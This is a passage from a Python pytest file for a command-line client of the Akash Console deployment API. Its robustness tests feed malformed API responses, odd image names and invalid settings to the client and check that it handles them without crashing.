        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "list_deployments") as mock_list:
            mock_list.return_value = [{"state": "active"}]
            with pytest.raises(SystemExit):
                api_main()


class TestCreateCloseDeploymentListResponse:
    """BUG: create_deployment / close_deployment crash with AttributeError
    when _request returns a JSON array (not a dict)."""

    @patch("just_akash.api.urllib.request.urlopen")
    def test_create_deployment_returns_list(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b'[{"dseq": "12345"}]'
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client.create_deployment("sdl")
        assert isinstance(result, dict)

    @patch("just_akash.api.urllib.request.urlopen")
    def test_close_deployment_returns_list(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b'[{"closed": true}]'
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client.close_deployment("12345")
        assert isinstance(result, dict)


class TestListDeploymentsInactiveNoFilter:
    """BUG: list_deployments(active_only=False) returns non-dict entries
    without filtering, unlike the active_only path."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_inactive_returns_garbage_filtered(self, mock_req):
        mock_req.return_value = {
            "data": [None, 42, {"dseq": "1", "deployment": {"state": "closed"}}]
        }
        client = AkashConsoleAPI("key")
        result = client.list_deployments(active_only=False)
        assert all(isinstance(d, dict) for d in result)


class TestLogBidTableNonDictBid:
    """BUG: _log_bid_table crashes with AttributeError when a bid entry
    is not a dict."""

    def test_non_dict_bid(self, capsys):
        from just_akash.deploy import _log_bid_table

        bids = [
            {"id": {"provider": "akash1prov"}, "price": {"amount": 10, "denom": "uakt"}},
            None,
        ]
        _log_bid_table(bids, "TEST")
        captured = capsys.readouterr()
        assert "2 bid(s)" in captured.out

    def test_all_non_dict_bids(self, capsys):
        from just_akash.deploy import _log_bid_table

        bids = [None, 42, "string"]
        _log_bid_table(bids, "TEST")
        captured = capsys.readouterr()
        assert "3 bid(s)" in captured.out


# ── Round 5 adversarial tests ────────────────────────────────────────────


class TestRequestReturnsNull:
    """BUG: _request returns None when API returns JSON null.
    All callers crash on None.get()."""

    @patch("just_akash.api.urllib.request.urlopen")
    def test_json_null_response(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b"null"
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client._request("GET", "/v1/test")
        assert isinstance(result, dict)

    @patch("just_akash.api.urllib.request.urlopen")
    def test_json_true_response(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b"true"
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client._request("GET", "/v1/test")
        assert isinstance(result, dict)


class TestExtractDseqNonDictDeploymentValue:
    """BUG: _extract_dseq crashes when deployment["deployment"] is a string
    or int — dep.get("id", {}) crashes on non-dict."""

    def test_deployment_value_is_string(self):
        result = _extract_dseq({"deployment": "not_a_dict"})
        assert result is None

    def test_deployment_value_is_int(self):
        result = _extract_dseq({"deployment": 42})
        assert result is None

    def test_deployment_id_is_string(self):
        result = _extract_dseq({"deployment": {"id": "not_a_dict"}})
        assert result is None


class TestExtractLeaseProviderNullId:
    """BUG: _extract_lease_provider crashes when lease["id"] is None.
    .get("id", {}) returns None (key exists), then "provider" in None TypeError."""

    def test_lease_id_is_none(self):
        from just_akash.api import _extract_lease_provider

        dep = {"leases": [{"id": None}]}
        result = _extract_lease_provider(dep)
        assert result is None

    def test_lease_id_is_string(self):
        from just_akash.api import _extract_lease_provider

        dep = {"leases": [{"id": "some_string"}]}
        result = _extract_lease_provider(dep)
        assert result is None


class TestFormatTableNonDictDeploymentValue:
    """BUG: format_deployments_table/json crash when d["deployment"] is non-dict.
    dep.get("state") crashes."""

    def test_table_deployment_is_string(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "deployment": "not_a_dict", "leases": []}
        result = format_deployments_table([dep])
        assert "12345" in result

    def test_json_deployment_is_string(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")
        dep = {"dseq": "12345", "deployment": "not_a_dict", "leases": []}
        result = format_deployments_json([dep])
        parsed = json.loads(result)
        assert parsed[0]["dseq"] == "12345"


class TestStatusNonDictPortEntry:
    """BUG: api_main status crashes when port entry p is non-dict (None/int)."""

    def test_port_entry_is_none(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [
                    {
                        "status": {
                            "forwarded_ports": {
                                "web": [
                                    None,
                                    {"port": 80, "host": "1.2.3.4", "externalPort": 8080},
                                ]
                            }
                        }
                    }
                ],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_port_entry_is_int(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [
                    {
                        "status": {
                            "forwarded_ports": {
                                "web": [42, {"port": 80, "host": "1.2.3.4", "externalPort": 8080}]
                            }
                        }
                    }
                ],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestStatusNonDictServiceInfo:
    """BUG: api_main status crashes when service info is non-dict (None/int)."""

    def test_service_info_is_none(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"services": {"web": None}}}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_service_info_is_string(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": {"services": {"web": "not_a_dict"}}}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestConfirmKeyboardInterrupt:
    """BUG: _confirm doesn't catch KeyboardInterrupt from input().
    Crashes the CLI instead of cancelling gracefully."""

    def test_keyboard_interrupt_returns_false(self):
        from just_akash.api import _confirm

        with patch("builtins.input", side_effect=KeyboardInterrupt):
            assert _confirm("Continue? (y/N) ") is False


class TestCreateLeaseReturnsNonDict:
    """BUG: create_lease returns raw non-dict (list/null) from _request
    with no isinstance guard. Callers expect dict."""

    @patch("just_akash.api.urllib.request.urlopen")
    def test_returns_null(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b"null"
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client.create_lease("12345", "akash1prov", "manifest")
        assert isinstance(result, dict)

    @patch("just_akash.api.urllib.request.urlopen")
    def test_returns_list(self, mock_urlopen):
        mock_resp = MagicMock()
        mock_resp.read.return_value = b'[{"lease": "data"}]'
        mock_resp.status = 200
        mock_resp.__enter__ = lambda s: s
        mock_resp.__exit__ = MagicMock(return_value=False)
        mock_urlopen.return_value = mock_resp

        client = AkashConsoleAPI("key")
        result = client.create_lease("12345", "akash1prov", "manifest")
        assert isinstance(result, dict)


class TestExtractBidPriceNonDictBidNested:
    """BUG: _extract_bid_price crashes when bid["bid"] is a non-dict (string).
    bid.get("bid", {}).get("price") chains .get() on string."""

    def test_bid_nested_is_string(self):
        bid = {"bid": "not_a_dict"}
        amount, denom = _extract_bid_price(bid)
        assert denom == "uact"

    def test_bid_nested_is_int(self):
        bid = {"bid": 42}
        amount, denom = _extract_bid_price(bid)
        assert denom == "uact"


class TestDeployBidPollingNonDictBid:
    """BUG: deploy.py bid polling crashes on non-dict bids with
    b.get("state", b.get("bid", {})...)."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_non_dict_bid_does_not_crash(self, MockAPI, mock_time, tmp_path, monkeypatch, capsys):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        SDL_YAML = 'version: "2.0"\nservices:\n  web:\n    image: python:3.13-slim\n'
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "55555", "manifest": "abc"}
        client.get_bids.return_value = [
            None,
            {"id": {"provider": "akash1prov"}, "price": {"amount": 10, "denom": "uakt"}},
            42,
        ]

        counter = [0.0]

        def advance():
            counter[0] += 1
            return counter[0]

        mock_time.time.side_effect = advance
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        result = deploy(sdl_path=str(sdl_file), bid_wait=10, bid_wait_retry=10)
        assert result["dseq"] == "55555"


# ── Round 6 adversarial tests ────────────────────────────────────────────


class TestExtractSshInfoTruthyNonDictStatus:
    """BUG: _extract_ssh_info crashes when lease["status"] is a truthy non-dict.
    `status = lease.get("status") or {}` only falls back to {} for falsy values.
    status=42, status=True, status="string" bypass the `or {}` guard."""

    def test_status_is_int(self):
        dep = {"leases": [{"status": 42}]}
        result = _extract_ssh_info(dep)
        assert result is None

    def test_status_is_true(self):
        dep = {"leases": [{"status": True}]}
        result = _extract_ssh_info(dep)
        assert result is None

    def test_status_is_string(self):
        dep = {"leases": [{"status": "online"}]}
        result = _extract_ssh_info(dep)
        assert result is None


class TestApiMainStatusNonDictLease:
    """BUG: api_main status display loop calls lease.get("status") without an
    isinstance guard on lease itself — None/int leases crash with AttributeError."""

    def test_none_lease_in_status_loop(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [None, {"id": {"provider": "akash1prov"}}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_int_lease_in_status_loop(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [42],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestApiMainStatusTruthyNonDictLeaseStatus:
    """BUG: api_main status display loop calls lease_status.get("forwarded_ports")
    without checking isinstance. If lease["status"] is a truthy non-dict (e.g., 42),
    `or {}` is bypassed and .get() crashes."""

    def test_lease_status_is_int(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": 42}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_lease_status_is_string(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [{"status": "pending"}],
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestApiMainStatusNoneEscrow:
    """BUG: api_main status crashes with AttributeError when deployment["escrow_account"]
    is explicitly None. deployment.get("escrow_account", {}) returns None (key exists),
    then None.get("state", {}) crashes."""

    def test_escrow_account_is_none(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [],
                "escrow_account": None,
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_escrow_account_is_string(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [],
                "escrow_account": "not_a_dict",
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestApiMainStatusNonDictFundEntry:
    """BUG: api_main status crashes with AttributeError when a fund entry in
    escrow_account.state.funds is non-dict (None, int). f.get("amount") crashes."""

    def test_fund_entry_is_none(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [],
                "escrow_account": {"state": {"funds": [None, {"amount": "100", "denom": "uakt"}]}},
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out

    def test_fund_entry_is_int(self, monkeypatch, capsys, tmp_path):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setattr(sys, "argv", ["api", "status", "--dseq", "12345"])
        monkeypatch.setattr(sys.stdout, "isatty", lambda: True)

        import just_akash.api as api_mod

        monkeypatch.setattr(api_mod, "TAGS_FILE", tmp_path / ".tags.json")

        with patch.object(AkashConsoleAPI, "get_deployment") as mock_get:
            mock_get.return_value = {
                "deployment": {"state": "active"},
                "leases": [],
                "escrow_account": {"state": {"funds": [42]}},
            }
            api_main()
        captured = capsys.readouterr()
        assert "State" in captured.out


class TestGetBidsNullBidsKey:
    """BUG: get_bids returns None when response is {"data": {"bids": null}}.
    data.get("bids", []) returns None (key exists with None value).
    Caller does len(bids) → TypeError."""

    @patch.object(AkashConsoleAPI, "_request")
    def test_bids_key_is_null(self, mock_req):
        mock_req.return_value = {"data": {"bids": None}}
        client = AkashConsoleAPI("key")
        result = client.get_bids("12345")
        assert isinstance(result, list)
        assert result == []

    @patch.object(AkashConsoleAPI, "_request")
    def test_bids_key_is_int(self, mock_req):
        mock_req.return_value = {"data": {"bids": 42}}
        client = AkashConsoleAPI("key")
        result = client.get_bids("12345")
        assert isinstance(result, list)
        assert result == []


class TestDeployImageOverrideBackslash:
    """BUG: deploy() image override uses re.sub() with a string replacement.
    If `image` contains backslashes, re.sub interprets them as backreferences.
    E.g. image="registry/img:v1.0-rc\\1" raises re.error or corrupts the SDL.
    FIX: use a lambda replacement so backslashes are never interpreted."""

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_image_with_backslash_literal(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        sdl = "version: '2.0'\nservices:\n  web:\n    image: old:latest\n"
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(sdl)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "12345", "manifest": "abc"}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1prov"}, "price": {"amount": 10, "denom": "uakt"}}
        ]
        client.create_lease.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        # Image with \1 would crash re.sub with string replacement
        image = "myrepo/image:v1.0-rc\\1"
        result = deploy(sdl_path=str(sdl_file), image=image, bid_wait=10, bid_wait_retry=10)
        assert result["dseq"] == "12345"
        # Verify the SDL sent to create_deployment contains the literal image
        call_sdl = client.create_deployment.call_args[0][0]
        assert f"image: {image}" in call_sdl

    @patch("just_akash.deploy.time")
    @patch("just_akash.deploy.AkashConsoleAPI")
    def test_image_with_backslash_n(self, MockAPI, mock_time, tmp_path, monkeypatch):
        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        sdl = "version: '2.0'\nservices:\n  web:\n    image: old:latest\n"
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(sdl)

        client = MockAPI.return_value
        client.create_deployment.return_value = {"dseq": "12345", "manifest": "abc"}
        client.get_bids.return_value = [
            {"id": {"provider": "akash1prov"}, "price": {"amount": 10, "denom": "uakt"}}
        ]
        client.create_lease.return_value = {}

        counter = [0.0]
        mock_time.time.side_effect = lambda: counter.__setitem__(0, counter[0] + 1) or counter[0]
        mock_time.sleep.return_value = None

        from just_akash.deploy import deploy

        # \n in image name would be silently corrupted by re.sub string replacement
        image = "myrepo\\nimage:latest"
        result = deploy(sdl_path=str(sdl_file), image=image, bid_wait=10, bid_wait_retry=10)
        assert result["dseq"] == "12345"
        call_sdl = client.create_deployment.call_args[0][0]
        assert f"image: {image}" in call_sdl


class TestFormatTableNonStringProvider:
    """BUG: format_deployments_table crashes with TypeError when
    _extract_lease_provider returns a non-string truthy value (e.g., an int).
    provider[:20] raises TypeError on non-string."""

    def test_provider_is_int(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")

        # Patch _extract_lease_provider to return an integer
        with patch("just_akash.api._extract_lease_provider", return_value=42):
            dep = {"dseq": "12345", "deployment": {"state": "active"}, "leases": []}
            result = format_deployments_table([dep])
        assert "12345" in result

    def test_provider_is_list(self, tmp_path, monkeypatch):
        from just_akash import api

        monkeypatch.setattr(api, "TAGS_FILE", tmp_path / ".tags.json")

        with patch("just_akash.api._extract_lease_provider", return_value=["akash1prov"]):
            dep = {"dseq": "12345", "deployment": {"state": "active"}, "leases": []}
            result = format_deployments_table([dep])
        assert "12345" in result


class TestLogBidTableBidValueIsNull:
    """BUG: _log_bid_table crashes with AttributeError when bid["bid"] is None.
    b.get("bid", {}) returns None (key exists), then None.get("state") crashes."""

    def test_bid_value_is_null(self, capsys):
        from just_akash.deploy import _log_bid_table

        bids = [{"bid": None, "price": {"amount": 10, "denom": "uakt"}}]
        _log_bid_table(bids, "TEST")
        captured = capsys.readouterr()
        assert "1 bid(s)" in captured.out

    def test_bid_value_is_int(self, capsys):
        from just_akash.deploy import _log_bid_table

        bids = [{"bid": 42, "price": {"amount": 10, "denom": "uakt"}}]
        _log_bid_table(bids, "TEST")
        captured = capsys.readouterr()
        assert "1 bid(s)" in captured.out


# ── Round 6 adversarial tests ────────────────────────────────────────────


class TestImageOverrideRegexSpecialChars:
    """BUG: Image override fails when image name contains regex special chars like . +"""

    def test_image_override_with_dot(self, tmp_path, monkeypatch):
        from just_akash.api import AkashConsoleAPI
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        SDL_WITH_DOT = """
version: "2.0"
services:
  web:
    image: ubuntu:22.04
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_WITH_DOT)

        client = AkashConsoleAPI("key")
        captured: dict = {}

        def _create(sdl, *a, **k):
            captured["sdl"] = sdl
            return {"dseq": "123", "manifest": "abc"}

        monkeypatch.setattr(client, "create_deployment", _create)
        monkeypatch.setattr(
            client, "get_bids", lambda _: [{"id": {"provider": "p"}, "price": {"amount": 10}}]
        )

        # bid_wait=0 runs no polls, so deploy raises "No bids" AFTER it has already
        # submitted the SDL — create_deployment has captured it by then.
        with (
            patch("just_akash.deploy.AkashConsoleAPI", return_value=client),
            pytest.raises(RuntimeError, match="No bids"),
        ):
            deploy(sdl_path=str(sdl_file), image="alpine:latest", bid_wait=0, bid_wait_retry=0)
        # The override was applied; the regex-special '.' in the original image name
        # did not corrupt the image: substitution.
        assert "alpine:latest" in captured["sdl"]
        assert "ubuntu:22.04" not in captured["sdl"]

    def test_image_override_with_plus(self, tmp_path, monkeypatch):
        from just_akash.api import AkashConsoleAPI
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.delenv("AKASH_PROVIDERS", raising=False)

        SDL_WITH_PLUS = """
version: "2.0"
services:
  web:
    image: node:18+lts
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_WITH_PLUS)

        client = AkashConsoleAPI("key")
        captured: dict = {}

        def _create(sdl, *a, **k):
            captured["sdl"] = sdl
            return {"dseq": "123", "manifest": "abc"}

        monkeypatch.setattr(client, "create_deployment", _create)
        monkeypatch.setattr(
            client, "get_bids", lambda _: [{"id": {"provider": "p"}, "price": {"amount": 10}}]
        )

        with (
            patch("just_akash.deploy.AkashConsoleAPI", return_value=client),
            pytest.raises(RuntimeError, match="No bids"),
        ):
            deploy(sdl_path=str(sdl_file), image="node:20", bid_wait=0, bid_wait_retry=0)
        # The override was applied; the '+' in the original image name did not corrupt
        # the image: substitution.
        assert "node:20" in captured["sdl"]
        assert "node:18+lts" not in captured["sdl"]


class TestDeployEmptySdlContent:
    """BUG: deploy() doesn't validate SDL content is non-empty."""

    def test_empty_sdl_file(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text("")

        with pytest.raises(RuntimeError):
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)

    def test_whitespace_only_sdl(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text("   \n  \t  \n")

        with pytest.raises(RuntimeError):
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)


class TestDeployNegativeBidWait:
    """BUG: deploy() allows negative bid_wait times, causing issues."""

    def test_negative_bid_wait(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        SDL_YAML = 'version: "2.0"\nservices:\n  web:\n    image: ubuntu\n'
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        # Should either validate or handle gracefully
        with pytest.raises((RuntimeError, ValueError)):
            deploy(sdl_path=str(sdl_file), bid_wait=-10, bid_wait_retry=0)


class TestSshPubkeyWithNewlines:
    """BUG: SSH_PUBKEY with newlines may cause base64 encoding issues."""

    def test_ssh_pubkey_with_newlines(self, tmp_path, monkeypatch):
        from just_akash.api import AkashConsoleAPI
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        monkeypatch.setenv("SSH_PUBKEY", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtest\nmore lines")

        SDL_WITH_PLACEHOLDER = """
version: "2.0"
services:
  web:
    image: ubuntu
    env:
      - SSH_KEY=PLACEHOLDER_SSH_PUBKEY_B64
"""
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_WITH_PLACEHOLDER)

        client = AkashConsoleAPI("key")
        monkeypatch.setattr(
            client, "create_deployment", lambda *a, **k: {"dseq": "123", "manifest": "abc"}
        )
        monkeypatch.setattr(
            client, "get_bids", lambda _: [{"id": {"provider": "p"}, "price": {"amount": 10}}]
        )

        with patch("just_akash.deploy.AkashConsoleAPI", return_value=client):
            try:
                deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)
                # Should not crash on newlines
                assert True
            except RuntimeError as e:
                if "No bids" in str(e):
                    pass
                else:
                    raise


class TestAkashProvidersEmptyEntries:
    """BUG: AKASH_PROVIDERS with empty entries after split creates empty strings."""

    def test_providers_with_empty_entries(self, monkeypatch):
        import os

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        # Empty entries between commas
        monkeypatch.setenv("AKASH_PROVIDERS", "akash1prov1,,akash1prov2,")

        # This should handle empty strings gracefully
        providers_env = os.environ.get("AKASH_PROVIDERS", "")
        allowed = [a.strip() for a in providers_env.split(",") if a.strip()]
        assert "akash1prov1" in allowed
        assert "akash1prov2" in allowed
        assert "" not in allowed


class TestSdlFilePermissions:
    """BUG: No check if SDL file is readable."""

    def test_unreadable_sdl_file(self, tmp_path, monkeypatch):
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text('version: "2.0"')
        sdl_file.chmod(0o000)  # Make unreadable

        with pytest.raises((RuntimeError, PermissionError)):
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)


class TestVeryLongDseq:
    """BUG: No validation on dseq length, could cause formatting issues."""

    def test_extremely_long_dseq(self, tmp_path, monkeypatch):
        from just_akash.api import format_deployments_table

        monkeypatch.setattr("just_akash.api.TAGS_FILE", tmp_path / ".tags.json")

        long_dseq = "1" * 1000
        deployments = [{"dseq": long_dseq, "deployment": {"state": "active"}, "leases": []}]
        result = format_deployments_table(deployments)
        assert long_dseq in result  # Should handle long dseqs


class TestTagsFileNonStringValues:
    """BUG: Tags file can contain non-string values like numbers."""

    def test_tags_file_with_numbers(self, tmp_path, monkeypatch):
        from just_akash import api

        tags_file = tmp_path / ".tags.json"
        tags_file.write_text('{"123": 456, "789": "string-tag"}')
        monkeypatch.setattr(api, "TAGS_FILE", tags_file)

        result = api._load_tags()
        assert isinstance(result, dict)
        assert result.get("123") == 456  # But this will be int, not str


class TestBidPollingZeroTimeout:
    """BUG: Zero bid_wait causes infinite polling."""

    def test_zero_bid_wait(self, tmp_path, monkeypatch):
        from just_akash.api import AkashConsoleAPI
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")
        SDL_YAML = 'version: "2.0"\nservices:\n  web:\n    image: ubuntu\n'
        sdl_file = tmp_path / "sdl.yaml"
        sdl_file.write_text(SDL_YAML)

        client = AkashConsoleAPI("key")
        monkeypatch.setattr(
            client, "create_deployment", lambda *a, **k: {"dseq": "123", "manifest": "abc"}
        )
        monkeypatch.setattr(client, "get_bids", lambda _: [])

        with (
            patch("just_akash.deploy.AkashConsoleAPI", return_value=client),
            pytest.raises(RuntimeError, match="No bids received"),
        ):
            # Should not hang indefinitely
            deploy(sdl_path=str(sdl_file), bid_wait=0, bid_wait_retry=0)


class TestImageOverrideNoImagesInSdl:
    """BUG: Image override on SDL without any images fails silently."""

    def test_image_override_no_images(self, tmp_path, monkeypatch):
        from just_akash.api import AkashConsoleAPI
        from just_akash.deploy import deploy

        monkeypatch.setenv("AKASH_API_KEY", "test-key")

        SDL_NO_IMAGES = """
version: "2.0"
services:
  web:
    # No image field
    expose:
      - port: 80
"""
